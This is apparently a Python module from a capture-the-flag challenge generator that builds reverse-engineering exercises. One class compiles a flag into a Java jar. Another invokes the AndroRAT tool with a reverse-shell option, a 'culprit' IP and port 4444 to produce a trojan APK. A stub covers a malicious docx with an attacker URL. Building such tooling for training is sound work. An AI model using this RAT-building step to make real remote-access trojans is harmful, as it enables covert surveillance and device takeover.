from .challenge import GeneratedChallenge
from .docker_builder import DockerBuilder
import subprocess
from os.path import join, dirname, realpath
import os
from shutil import make_archive
import shutil
from .utils import WorkDir, fwrite, join
from pathlib import Path
# from os import join


class SimpleStringRE(GeneratedChallenge):
    yaml_tag = u'!simple_string_re'
    """

    Config:
        TODO: Some custom welcome message or resources
    """

    def gen(self, chal_dir):
        pass


class SimpleJarRE(GeneratedChallenge):
    yaml_tag = u'!simple_jar_re'
    __doc__ = """
    Find a secret message by decompiling a jar file.

    Config:
        None
    """

    def gen(self, chal_dir):
        source_file_path = join(dirname(realpath(__file__)),
                                'chal_files', 'reverse_engineering')

        fwrite(source_file_path, 'MyClass.java', chal_dir,
               'MyClass.java', jinja=True, flag=self.flag)

        builder = DockerBuilder(
            base_img="openjdk",
            included_files=[join(chal_dir, 'MyClass.java')],
            output_files=[join("input", 'chal.jar')],
            outdir=chal_dir
        )

        with builder as b:
            b.run('cd input')
            b.run("javac MyClass.java")
            b.run("jar cf MyJar.jar MyClass.class")
            b.run("mv MyJar.jar chal.jar")

        self.chal_file = "chal.jar"

class ApkTrojanRE(GeneratedChallenge):
    yaml_tag = u'!apk_trojan_re'
    __doc__ = """
    Find the flag by decompiling an apk file and finding the culprit's ip address.

    Config:

        cuprit_ip - ip address of the culprit
    """

    def gen(self, chal_dir):
        androrat_path = Path("./chal_types/chal_files/AndroRAT-master")
        with WorkDir(chal_dir):
            if (androrat_path.exists()):
                subprocess.call("python3 androRAT.py --build --shell -i culprit:"+self.get_value("culprit_ip")+","+self.flag+" -p 4444 -o trojan.apk", cwd="./chal_types/chal_files/AndroRAT-master")
                self.chal_file = "trojan.apk"
            else:
                print("AndroRAT-master not found. Please clone it from https://github.com/karma9874/AndroRAT.git and place it in the chal_types/chal_files directory. Ensure that the folder with -master in the name is placed in the chal_files directory.")


class DocxMalware(GeneratedChallenge):
    yaml_tag = u'!docx_malware'
    """
    
    Config:
        url: attacker url that the malware references
        num_parts: number of parts to split the flag into
    """

    def gen(self, chal_dir):
        # Finish later
        pass
